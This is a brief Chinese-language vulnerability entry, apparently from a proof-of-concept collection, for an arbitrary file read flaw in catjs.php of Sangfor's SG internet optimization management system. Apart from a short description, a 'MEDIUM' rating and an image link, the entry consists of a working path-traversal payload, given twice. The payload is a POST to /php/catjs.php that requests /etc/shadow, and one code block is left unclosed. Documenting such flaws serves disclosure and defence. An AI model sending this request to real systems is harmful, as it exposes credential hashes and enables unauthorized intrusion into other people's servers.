# 深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞

## 漏洞描述
深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828111216211](images/image-20230828111216211.png)

验证POC

```
POST /php/catjs.php

["../../../../../../etc/shadow"]

## Payloads
```
POST /php/catjs.php

["../../../../../../etc/shadow"]
```
